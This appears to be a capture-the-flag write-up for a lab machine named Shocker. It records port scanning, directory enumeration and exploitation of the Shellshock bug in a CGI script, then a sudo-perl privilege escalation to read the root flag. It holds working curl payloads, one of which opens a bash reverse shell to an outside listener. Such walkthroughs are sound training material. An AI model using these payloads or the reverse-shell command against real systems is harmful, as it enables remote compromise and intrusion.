@@ -1,0 +1,74 @@
+System 
+
+System info : 
+
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
+NAME="Ubuntu"
+VERSION="16.04.3 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.3 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+
+Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+OVScan Details : 
+
+ORT     STATE SERVICE    VERSION
+80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+2222/tcp open  tcpwrapped
+Aggressive OS guesses: Linux 3.2 - 4.6 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), 
+Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), 
+Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%)
+
+
+###Vulnerability : Shellshock ##################
+
+Enumeration : 
+
+dirb http://10.10.10.56 /usr/share/dirb/wordlist/big.txt -X .sh
+
+or 
+
+dirb http://10.10.10.56 /usr/share/dirb/wordlist/big.txt -X /usr/share/dirb/wordlists/extensions_common.txt
+
+Result : Found a user.sh file.
+
+#### After a little of searching, get to know that, it is a shellshock vulnerability ####
+
+############### Hack : #########
+
+1. Use metasploit
+
+search shellshock
+exploit : exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+Payload : generic/shell_reverse_tcp or meterpreter/reverse_tcp
+
+2. Directly on the command line
+
+On shell prompt : 
+
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh
+or 
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.115/4444 0>&1" http://10.10.10.56/cgi-bin/user.sh
+
+############### Privilage escalation : ####################
+
+#To check, which command we can run using sudo
+sudo -l
+
+## Result shows, we can execute perl as root (Or with sudo) privilage with no password.
+
+#To run system command with perl scripting directly on the system shell (bash)
+$ sudo perl -e "system('cat /root/root.txt')"
+
+##Above command gives us the root flag.
